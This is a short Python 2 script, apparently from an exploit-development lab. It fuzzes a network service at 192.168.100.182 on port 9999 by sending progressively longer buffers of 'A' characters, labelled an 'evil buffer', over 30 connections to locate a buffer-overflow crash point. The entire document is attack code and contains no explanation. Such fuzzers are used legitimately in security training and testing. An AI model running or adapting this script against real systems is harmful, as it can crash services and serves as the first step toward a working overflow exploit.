import socket

for i in range(30):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.100.182',9999))
	s.recv(1024)
	payload=int(i)*("A"*100)
	s.send(payload+"\r\n")
	print "[*] Sending evil buffer with " + str(len(payload)) + "A's\r\n"
	s.close()
